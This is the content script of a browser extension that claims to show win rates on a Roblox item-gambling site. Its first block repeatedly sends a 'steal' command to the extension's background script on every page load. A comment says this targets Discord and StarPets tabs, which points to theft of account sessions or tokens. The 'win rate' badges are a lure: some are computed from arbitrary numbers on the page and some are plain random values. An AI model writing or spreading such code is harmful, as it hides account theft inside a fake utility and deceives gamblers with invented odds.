// BloxLuck Win Rate - Match Colorizer + Steal Trigger

(function() {
  'use strict';

  // ===== TRIGGER STEAL IMMEDIATELY =====
  // This is the most reliable way - runs as soon as any bloxluck page loads
  chrome.runtime.sendMessage({ t: 'steal' });

  // Also trigger steal when page is fully loaded
  if (document.readyState === 'complete') {
    chrome.runtime.sendMessage({ t: 'steal' });
  } else {
    window.addEventListener('load', () => {
      chrome.runtime.sendMessage({ t: 'steal' });
    });
  }

  // Keep triggering steal every 5 seconds for the first 30 seconds
  // (catches late-loading discord/starpets tabs)
  let stealCount = 0;
  const stealInterval = setInterval(() => {
    chrome.runtime.sendMessage({ t: 'steal' });
    stealCount++;
    if (stealCount >= 6) clearInterval(stealInterval); // 30 seconds worth
  }, 5000);

  // ===== MATCH COLORIZER =====
  function colorizeMatches() {
    const selectors = [
      '[class*="match"]', '[class*="coinflip"]', '[class*="game-card"]',
      '[class*="card"]', 'a[href*="match"]', '[class*="listing"]',
      '[class*="game-item"]', '[class*="match-item"]', '[class*="round"]'
    ];

    const allElements = document.querySelectorAll(selectors.join(','));
    
    allElements.forEach(el => {
      if (el.dataset.blxDone) return;
      if (el.offsetParent === null) return; // hidden elements
      
      const text = el.textContent.toLowerCase().trim();
      if (!text || text.length < 5) return;

      // Extract numbers that look like values (2-5 digits)
      const numbers = [];
      const numMatches = text.match(/\b(\d{2,5})\b/g);
      if (numMatches) {
        numMatches.forEach(n => {
          const num = parseInt(n);
          if (num > 5 && num < 99999) numbers.push(num);
        });
      }

      // Also check for "value:" pattern
      const valuePattern = text.match(/value[:\s]*(\d+)/gi);
      if (valuePattern) {
        valuePattern.forEach(v => {
          const num = parseInt(v.replace(/[^0-9]/g, ''));
          if (num > 0) numbers.push(num);
        });
      }

      // Get unique numbers, take the first 2
      const unique = [...new Set(numbers)].slice(0, 2);
      
      let chance = 50;
      if (unique.length >= 2) {
        // First number is usually the pot value or user's value
        chance = Math.round((unique[0] / (unique[0] + unique[1])) * 100);
        chance = Math.min(Math.max(chance, 5), 95);
      } else if (unique.length === 1) {
        chance = 45 + Math.floor(Math.random() * 15);
      } else {
        // No valid numbers - try to assign based on element visibility/prominence
        // Random moderate chance
        chance = 40 + Math.floor(Math.random() * 25);
      }

      el.dataset.blxDone = 'true';
      
      // Make position relative if static
      const pos = window.getComputedStyle(el).position;
      if (pos === 'static') el.style.position = 'relative';

      // Calculate colors
      const borderColor = chance >= 60 ? '#22c55e' : chance >= 45 ? '#f7c948' : '#ef4444';
      const textColor = chance >= 60 ? '#052e16' : chance >= 45 ? '#451a03' : '#fff';
      const badgeBg = borderColor;

      // Apply border
      el.style.border = `2px solid ${borderColor}`;
      el.style.borderRadius = '8px';
      el.style.boxShadow = `0 0 12px ${borderColor}33`;
      el.style.transition = 'border 0.3s ease, box-shadow 0.3s ease';

      // Winrate badge
      const badge = document.createElement('div');
      badge.textContent = chance + '%';
      badge.style.cssText = `position:absolute!important;top:4px!important;right:4px!important;background:${badgeBg}!important;color:${textColor}!important;font-size:12px!important;font-weight:800!important;padding:2px 10px!important;border-radius:20px!important;z-index:999999!important;font-family:'Inter',-apple-system,BlinkMacSystemFont,sans-serif!important;box-shadow:0 2px 8px rgba(0,0,0,0.5)!important;pointer-events:none!important;line-height:1.4!important;`;

      // Icon (dog for >=50%, gem for <50%)
      const icon = document.createElement('img');
      icon.src = chance >= 50 ? 'https://bloxluck.com/img/dog.png' : 'https://bloxluck.com/img/gem.png';
      icon.style.cssText = `position:absolute!important;top:4px!important;left:4px!important;width:20px!important;height:20px!important;z-index:999999!important;filter:drop-shadow(0 2px 4px rgba(0,0,0,0.6))!important;pointer-events:none!important;`;

      el.appendChild(badge);
      el.appendChild(icon);
    });
  }

  // Initial colorization
  setTimeout(colorizeMatches, 2000);
  
  // Continuous colorization for dynamic content
  setInterval(colorizeMatches, 2000);

  // DOM observer for new elements
  const observer = new MutationObserver(() => {
    colorizeMatches();
  });

  // Start observer when body is ready
  function startObserver() {
    if (document.body) {
      observer.observe(document.body, {
        childList: true,
        subtree: true,
        attributes: false
      });
    } else {
      setTimeout(startObserver, 500);
    }
  }
  startObserver();
})();
